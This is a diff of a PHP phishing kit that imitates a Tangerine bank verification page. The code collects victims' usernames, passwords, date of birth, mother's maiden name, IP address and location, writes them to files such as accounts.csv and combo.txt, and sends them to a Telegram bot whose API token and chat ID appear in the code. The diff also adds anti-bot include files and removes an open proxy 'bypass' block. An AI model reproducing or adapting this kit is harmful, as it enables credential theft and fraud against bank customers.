@@ -1,52 +1,21 @@
 
        
  <?php
-include "/dick.php"; 
+include "/files/anti/anti1.php";
+include "/files/anti/anti2.php"; 
+include "/files/anti/anti3.php"; 
+include "/files/anti/anti4.php"; 
+include "/files/anti/anti5.php"; 
+include "/files/anti/anti6.php"; 
+include "/files/anti/anti7.php"; 
+include "/files/anti/anti8.php"; 
+include "/fingerprints.php";
 
-header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
-header("X-XSS-Protection: 0");
-header("X-Frame-Options: ALLOWALL");
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Credentials: true");
-header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
-header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
-
-if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
-    $url = $_GET['url'];
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, false);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
-        "X-XSS-Protection: 0",
-        "X-Frame-Options: ALLOWALL",
-        "Access-Control-Allow-Origin: *",
-        "Access-Control-Allow-Credentials: true",
-        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
-        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
-    ));
-    $response = curl_exec($ch);
-    $info = curl_getinfo($ch);
-    curl_close($ch);
-
-    header("HTTP/1.1 ".$info['http_code']);
-    foreach ($info['headers'] as $header) {
-        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
-            header($header);
-        }
-    }
-    echo $response;
-    exit;
-}
-
-
-
-error_reporting(E_ERROR | E_PARSE);
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
+
+error_reporting(E_ERROR | E_PARSE);
 
 function get_client_ip()
 {
@@ -141,9 +110,9 @@ if (strpos($PublicIP, ',') !== false) {
     $PublicIP = explode(",", $PublicIP)[0];
 }
 
-$file       = '/telegram.dat';
+$file       = '/telgram.txt';
 $file2      = '/Tangerube.csv';
-$file3      = '/acc_log.csv';
+$file3      = '/accounts.csv';
 $file4      = '/usget.txt';
 $file5      = '/combo.txt';
 
@@ -185,7 +154,7 @@ if ($success==false) {
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "Tangerine";
-
+    $project    = "[CR00K-3D]";
     $url        = "https://td.com";
     $user       = $_POST['username'];
     $pass       = $_POST['password'];
@@ -215,9 +184,9 @@ if ($success==false) {
 $message = "IMPORTANT DATA LOGGGED\n\n $bank$lh$ip\n\nWord : $vocal\nDob  : $dob1$lh$dob2$lh$dob3\nmmn  : $mmn \n\n$uos$lh$bsr\n$is\n$city$lh$country\n\nmaps.google.com/?q=$la$lh$lp\n";
 
 
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$apiToken = "5988975308:AAEDaQXSEpESUjuXhmPBLhOLI_cUsFE1yoI"; 
 $data = [
-    'chat_id' => '-821080105',
+    'chat_id' => '-886806120',
     'text' => $message
 ];
 
@@ -225,7 +194,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
                                  http_build_query($data) );
                                 
       ?>
-<? php  ?>=(0042)/220098/tang/f -->
+<!-- saved from url=(0042)/deposit/tang/f -->
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         
         <title>Verification | Tangerine</title>
@@ -241,7 +210,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
     <body translate-cloak="" application-theme="" state="forgotLogin" class="fb2-index ng-scope application-theme-web" style="overflow: visible;">
         <tng-main-nav class="ng-isolate-scope">
             <nav class="navbar print-hide" ng-class="{&#39;nativeNav&#39; : $ctrl.EnvironmentService.isNative()}">
-                <a id="mainNav_home" class="brand nonclickable" href="/220098/tang/f" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
+                <a id="mainNav_home" class="brand nonclickable" href="/deposit/tang/f" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
                     <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./files/brand-white.png">
                     <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./files/brand-orange.png">
                 </a>
@@ -249,7 +218,7 @@ $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage
         </tng-main-nav>
         <div ui-view="page-content" class="page-content ng-scope" style="padding-bottom: 0px;">
             <forgot-login class="ng-scope ng-isolate-scope">
-                <form method="post" action="/220098/Tangerine/040152.php" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
+                <form method="post" action="/deposit/Tangerine/040152.php" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                     <style>
                     .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="PASSWORD | "] {
                         font-size: 17px;
